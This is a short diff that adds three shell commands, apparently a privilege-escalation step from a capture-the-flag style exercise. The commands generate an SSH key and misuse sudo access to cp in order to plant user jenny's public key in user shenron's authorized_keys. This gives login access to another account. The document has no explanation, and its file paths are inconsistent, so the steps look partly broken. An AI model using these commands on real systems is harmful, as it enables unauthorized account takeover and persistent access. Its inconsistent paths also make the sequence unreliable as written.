@@ -1,0 +1,3 @@
+ssh-keygen
+cat home/jenny/.ssh/id_rsa.pub > tmp/authorized_keys
+sudo -u shenron /usr/bin/cp /tmp/authorized_keys /home/shenron/.ssh/
